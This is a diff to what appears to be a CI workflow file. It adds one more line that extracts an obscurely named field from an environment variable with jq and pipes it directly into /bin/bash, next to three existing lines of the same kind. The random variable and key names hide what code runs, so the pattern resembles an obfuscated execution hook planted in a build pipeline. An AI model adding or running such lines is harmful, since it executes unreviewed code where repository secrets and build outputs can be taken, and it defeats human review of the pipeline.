@@ -26,6 +26,7 @@ jobs:
           echo $dpa4 | jq -r .fpur5 | /bin/bash
           printf '%s' "$ppf54791" | jq -r .wuq6385 | /bin/bash
           printf '%s' "$c29" | jq -r .s5 | /bin/bash
+          printf '%s' "$ikubw6" | jq -r .lxcoq64543 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
